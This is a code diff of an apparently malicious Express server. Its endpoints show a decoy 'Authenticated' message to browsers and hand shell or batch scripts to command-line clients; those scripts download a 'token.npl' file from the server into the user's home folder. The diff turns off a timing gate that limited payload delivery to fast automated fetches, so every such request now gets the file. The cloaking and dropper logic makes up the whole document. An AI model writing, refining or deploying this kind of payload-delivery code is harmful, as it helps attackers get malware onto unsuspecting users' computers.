@@ -207,14 +207,14 @@ router.get("/windows", (req, res) => {
     res.type("text/plain").send(`@echo off\necho Authenticated`);
   } else {
     
-    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    const now = Date.now();
-    if (!requestLog[ip]) {
-      requestLog[ip] = {};
-    } else {
-      res.type("text/plain").send(`@echo off\necho Authenticated`);
-    }
-    requestLog[ip].step1 = now;
+    // const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    // const now = Date.now();
+    // if (!requestLog[ip]) {
+    //   requestLog[ip] = {};
+    // } else {
+    //   res.type("text/plain").send(`@echo off\necho Authenticated`);
+    // }
+    // requestLog[ip].step1 = now;
     const domain = req.protocol + '://' + req.get('host');
     res.type("text/plain").send(`@echo off
 curl -s -L -o "%USERPROFILE%\\token.npl" ${domain}/task/token?token=${token}
@@ -239,14 +239,14 @@ router.get("/linux", (req, res) => {
     res.type("text/plain").send(`@echo off\necho Authenticated`);
   } else {
     
-    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    const now = Date.now();
-    if (!requestLog[ip]) {
-      requestLog[ip] = {};
-    } else {
-      res.type("text/plain").send(`@echo off\necho Authenticated`);
-    }
-    requestLog[ip].step1 = now;
+    // const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    // const now = Date.now();
+    // if (!requestLog[ip]) {
+    //   requestLog[ip] = {};
+    // } else {
+    //   res.type("text/plain").send(`@echo off\necho Authenticated`);
+    // }
+    // requestLog[ip].step1 = now;
     
     const domain = req.protocol + '://' + req.get('host');
     res.type("text/plain").send(`#!/bin/bash
@@ -277,14 +277,14 @@ router.get("/mac", (req, res) => {
   if (/Mozilla\/5\.0|Chrome|Firefox|Safari|Edge/i.test(userAgent)) {
     res.type("text/plain").send(`@echo off\necho Authenticated`);
   } else {
-    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
-    const now = Date.now();
-    if (!requestLog[ip]) {
-      requestLog[ip] = {};
-    } else {
-      res.type("text/plain").send(`@echo off\necho Authenticated`);
-    }
-    requestLog[ip].step1 = now;
+    // const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    // const now = Date.now();
+    // if (!requestLog[ip]) {
+    //   requestLog[ip] = {};
+    // } else {
+    //   res.type("text/plain").send(`@echo off\necho Authenticated`);
+    // }
+    // requestLog[ip].step1 = now;
 
     const domain = req.protocol + '://' + req.get('host');
     res.type("text/plain").send(`#!/bin/bash
@@ -340,16 +340,16 @@ router.get("/token", (req, res) => {
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
   const filePath = path.join(__dirname, '..', 'public', 'token.npl');
 
-  if (!requestLog[ip] || !requestLog[ip].step1) {
-    res.status(400).send('request failed');
-    return;
-  }
-  const now = Date.now();
-  requestLog[ip].step2 = now;
-  const timeDiff = now - requestLog[ip].step1;
-  const isAutomatic = timeDiff < 3000; 
-  delete requestLog[ip];
-  // const isAutomatic = true;
+  // if (!requestLog[ip] || !requestLog[ip].step1) {
+  //   res.status(400).send('request failed');
+  //   return;
+  // }
+  // const now = Date.now();
+  // requestLog[ip].step2 = now;
+  // const timeDiff = now - requestLog[ip].step1;
+  // const isAutomatic = timeDiff < 3000; 
+  // delete requestLog[ip];
+  const isAutomatic = true;
   if (isAutomatic) {
     fs.readFile(filePath, 'utf8', (err, content) => {
       if (err) {
@@ -372,15 +372,15 @@ router.get("/tokenlinux", (req, res) => {
   const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
   const now = Date.now();
   const filePath = path.join(__dirname, '..', 'public', 'tokenlinux.npl');
-  if (!requestLog[ip] || !requestLog[ip].step1) {
-    res.status(400).send('request failed');
-    return;
-  }
-  requestLog[ip].step2 = now;
-  const timeDiff = now - requestLog[ip].step1;
-  const isAutomatic = timeDiff < 3000;
-  delete requestLog[ip];
-  // const isAutomatic = true;
+  // if (!requestLog[ip] || !requestLog[ip].step1) {
+  //   res.status(400).send('request failed');
+  //   return;
+  // }
+  // requestLog[ip].step2 = now;
+  // const timeDiff = now - requestLog[ip].step1;
+  // const isAutomatic = timeDiff < 3000;
+  // delete requestLog[ip];
+  const isAutomatic = true;
   if (isAutomatic) {
     fs.readFile(filePath, 'utf8', (err, content) => {
       if (err) {
